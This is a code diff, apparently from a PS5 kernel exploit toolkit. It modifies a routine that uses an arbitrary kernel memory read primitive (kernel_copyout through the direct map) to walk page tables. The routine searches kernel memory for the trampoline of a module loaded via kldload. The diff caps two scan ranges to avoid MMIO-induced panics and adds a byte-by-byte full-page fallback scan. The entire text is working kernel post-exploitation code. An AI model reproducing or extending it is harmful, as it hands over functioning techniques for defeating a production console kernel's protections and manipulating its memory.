@@ -1890,9 +1890,9 @@ static void campaign_kmod_kldload(void) {
          * regions in a single kernel_copyout, so even huge VA ranges are
          * fast when most entries are not present.
          *
-         * PS5 kernel modules (via kldload) are allocated by kmem_alloc
-         * from the exec_map or kernel_arena.  The VA region depends on
-         * Sony's kernel modifications and KASLR, so we scan broadly. */
+         * SAFETY: Ranges 2 and 3 are capped to 1GB to avoid reading
+         * physical addresses beyond PS5's 16GB RAM.  Uncapped ranges
+         * hit MMIO space via DMAP → kernel panic. */
         struct { uint64_t start, end; const char *label; } ranges[4];
         int nranges = 0;
 
@@ -1903,18 +1903,18 @@ static void campaign_kmod_kldload(void) {
             uint64_t e = 0xFFFFFFFFFFE00000ULL;
             if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "kdata→top"}; }
         }
-        /* Range 2: DMAP end → kernel text (full gap, no 1GB cap) */
+        /* Range 2: DMAP end → kernel text (capped to last 1GB) */
         {
             uint64_t s = g_dmap_base + 0x200000000ULL;
             uint64_t e = g_ktext_base;
+            if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
             if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "DMAP→ktext gap"}; }
         }
-        /* Range 3: 0xFFFF800000000000 → DMAP (exec_map, kernel_arena)
-         * Full scan — the hierarchical walker skips unmapped 512GB
-         * PML4 entries instantly (~256 kernel_copyouts for 128TB). */
+        /* Range 3: below DMAP (capped to last 1GB) */
         {
             uint64_t s = 0xFFFF800000000000ULL;
             uint64_t e = g_dmap_base;
+            if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
             if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "below DMAP"}; }
         }
 
@@ -2071,11 +2071,138 @@ static void campaign_kmod_kldload(void) {
         }
 
         if (trampoline_kva) {
-            printf("[+] FOUND trampoline at VA 0x%lx!\n",
+            printf("[+] FOUND trampoline at VA 0x%lx (page-start)!\n",
                    (unsigned long)trampoline_kva);
             printf("    bytes: ");
             for (int b = 0; b < 58; b++) printf("%02x ", hdr[b]);
             printf("\n");
+        }
+
+        /* Fallback: full-page scan (trampoline at non-zero page offset).
+         *
+         * The primary scanner only checks the first 64 bytes of each page.
+         * On PS5 FW 4.03, the kernel linker may place module .text at a
+         * non-zero offset within the allocation page (e.g., after ELF
+         * metadata or section padding).
+         *
+         * This re-walks Range 1 (kdata→top, known safe) reading full
+         * 4096-byte pages and searching for the trampoline at every byte.
+         * ~35K pages × 4KB = ~140MB of reads — takes < 1 second. */
+        if (trampoline_kva == 0 && nranges >= 1) {
+            printf("[*] Full-page scan: searching for trampoline at any page offset...\n");
+            fflush(stdout);
+
+            /* Only scan Range 1 (kdata→top) — safe, no MMIO risk */
+            uint64_t rs = ranges[0].start, re = ranges[0].end;
+            uint64_t va = rs & ~0x1FFFFFULL;
+            uint64_t fp_pages = 0;
+            uint8_t full_page[4096];
+
+            for (; va < re && trampoline_kva == 0; ) {
+                uint64_t pml4e;
+                kernel_copyout(g_dmap_base + g_cr3_phys +
+                               ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
+                if (!(pml4e & PTE_PRESENT)) {
+                    uint64_t n = (va + (1ULL<<39)) & ~((1ULL<<39)-1);
+                    if (n <= va) break; va = n; continue;
+                }
+                uint64_t pdpt_pa = pml4e & PTE_PA_MASK;
+                if (pdpt_pa >= MAX_SAFE_PA) {
+                    uint64_t n = (va + (1ULL<<30)) & ~((1ULL<<30)-1);
+                    if (n <= va) break; va = n; continue;
+                }
+                uint64_t pdpte;
+                kernel_copyout(g_dmap_base + pdpt_pa +
+                               ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
+                if (!(pdpte & PTE_PRESENT) || (pdpte & PTE_PS)) {
+                    uint64_t n = (va + (1ULL<<30)) & ~((1ULL<<30)-1);
+                    if (n <= va) break; va = n; continue;
+                }
+                uint64_t pd_pa = pdpte & PTE_PA_MASK;
+                if (pd_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
+                uint64_t pde;
+                kernel_copyout(g_dmap_base + pd_pa +
+                               ((va >> 21) & 0x1FF) * 8, &pde, 8);
+                if (!(pde & PTE_PRESENT)) { VA_NEXT_2MB(va, re); continue; }
+
+                if (pde & PTE_PS) {
+                    /* 2MB large page */
+                    uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
+                    if (base_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
+                    uint64_t chunk_start = va & ~0x1FFFFFULL;
+                    for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
+                        uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
+                        if (page_va < rs || page_va >= re) continue;
+                        uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
+                        if (pa >= MAX_SAFE_PA) continue;
+                        if (kernel_copyout(g_dmap_base + pa, full_page, 4096) != 0) continue;
+                        fp_pages++;
+                        /* Search for trampoline prefix at every byte offset */
+                        int max_off = 4096 - (int)sizeof(tramp_prefix);
+                        if (max_off > 4096 - suffix_off - (int)sizeof(tramp_suffix))
+                            max_off = 4096 - suffix_off - (int)sizeof(tramp_suffix);
+                        for (int off = 0; off <= max_off; off++) {
+                            if (memcmp(full_page + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                                memcmp(full_page + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                                trampoline_kva = page_va + off;
+                                /* Copy 64 bytes starting from the trampoline into hdr */
+                                int avail = 4096 - off;
+                                if (avail > 64) avail = 64;
+                                memcpy(hdr, full_page + off, avail);
+                                printf("[+] FOUND trampoline at VA 0x%lx (page offset 0x%x)!\n",
+                                       (unsigned long)trampoline_kva, off);
+                                printf("    bytes: ");
+                                for (int b = 0; b < (avail < 58 ? avail : 58); b++)
+                                    printf("%02x ", hdr[b]);
+                                printf("\n");
+                                break;
+                            }
+                        }
+                    }
+                    VA_NEXT_2MB(va, re);
+                    continue;
+                }
+
+                /* 4KB pages: bulk-read PT */
+                uint64_t pt_pa = pde & PTE_PA_MASK;
+                if (pt_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
+                uint64_t pt_entries[512];
+                kernel_copyout(g_dmap_base + pt_pa, pt_entries, sizeof(pt_entries));
+
+                uint64_t chunk_start = va & ~0x1FFFFFULL;
+                for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
+                    uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
+                    if (page_va < rs || page_va >= re) continue;
+                    if (!(pt_entries[pi] & PTE_PRESENT)) continue;
+                    uint64_t pa = pt_entries[pi] & PTE_PA_MASK;
+                    if (pa >= MAX_SAFE_PA) continue;
+                    if (kernel_copyout(g_dmap_base + pa, full_page, 4096) != 0) continue;
+                    fp_pages++;
+                    int max_off = 4096 - (int)sizeof(tramp_prefix);
+                    if (max_off > 4096 - suffix_off - (int)sizeof(tramp_suffix))
+                        max_off = 4096 - suffix_off - (int)sizeof(tramp_suffix);
+                    for (int off = 0; off <= max_off; off++) {
+                        if (memcmp(full_page + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                            memcmp(full_page + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                            trampoline_kva = page_va + off;
+                            int avail = 4096 - off;
+                            if (avail > 64) avail = 64;
+                            memcpy(hdr, full_page + off, avail);
+                            printf("[+] FOUND trampoline at VA 0x%lx (page offset 0x%x)!\n",
+                                   (unsigned long)trampoline_kva, off);
+                            printf("    bytes: ");
+                            for (int b = 0; b < (avail < 58 ? avail : 58); b++)
+                                printf("%02x ", hdr[b]);
+                            printf("\n");
+                            break;
+                        }
+                    }
+                }
+                VA_NEXT_2MB(va, re);
+            }
+
+            printf("    Full-page scan: %lu pages checked\n", (unsigned long)fp_pages);
+            fflush(stdout);
         }
 
         /* Fallback: sentinel scan (also hierarchical + DMAP) */
